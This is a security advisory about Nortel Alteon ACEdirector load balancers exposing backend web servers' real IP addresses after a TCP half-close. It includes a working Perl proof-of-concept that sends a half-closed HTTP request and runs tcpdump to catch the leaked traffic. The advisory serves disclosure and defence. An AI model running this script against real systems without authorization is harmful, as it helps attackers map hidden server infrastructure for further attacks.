source: https://www.securityfocus.com/bid/3964/info

Alteon ACEdirector is a hardware solution distributed by Nortel Networks. ACEdirector runs the Nortel WebOS operating system.

It is possible to retrieve the real IP addresses of webservers that are managed by an ACEdirector. When a client is connected to a webserver via the virtual IP address of the ACEdirector, the connection to a web server in the load balanced pool is tracked by a cookie and session id, and the traffic is altered to appear as though it is coming from the ACEdirector.

When a client has half-closed a connection to the ACEdirector, the load balancer will no longer alter the traffic to the client to appear as though it is coming from the ACEdirector's IP address. The traffic will continue to come from the webserver, but will instead come from the real IP address of the web server.

#! /usr/local/bin/perl

# acedirector_request - trivial script to do an HTTP Simple-Request of "/"
#                       utilizing TCP half-close.
#
#                       This script was written to demonstrate how one can
#                       elicit erroneous behavior from an Alteon/Nortel
#                       ACEdirector which has been configured to use its
#                       "Server Load Balancing" (SLB) and "Cookie-Based
#                       Persistence" features.
#
# Dave Plonka <plonka@doit.wisc.edu>, Dec 20 2001

use IO::Socket;
use FindBin;
use Getopt::Std;

if (!getopts('c:') or '' eq $ARGV[0]) {
   die "usage: $FindBin::Script [-c COOKIE] web_server\n"
}

my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
                                 PeerPort => 'http(80)',
				 Proto    => 'tcp');
die unless ref($sock);

if (!$opt_c) {
   print $sock "GET /\r\n";
} else {
   print $sock "GET / HTTP/1.0\r\nCookie: ${opt_c}=X\r\n\r\n";
}

$sock->shutdown(1);

@response = <$sock>;

if (@response) {
   print join("\n", @response)
} else {
   if ($opt_c) {
      my $command = "tcpdump -nv tcp and port 80 and not host $ARGV[0]";
      warn "$ARGV[0] did not respond to TCP half-closed request.\n" .
           " Launching tcpdump to watch for RST...\n";
      system($command . " 2>&1");
      if (0 != ($?/256)) {
         warn "\"$command\" failed.\n"
      }
   } else {
      warn "$ARGV[0] did not response to TCP half-closed request.\n" .
	   "It might be an ACEdirector.\n"
   }
}

exit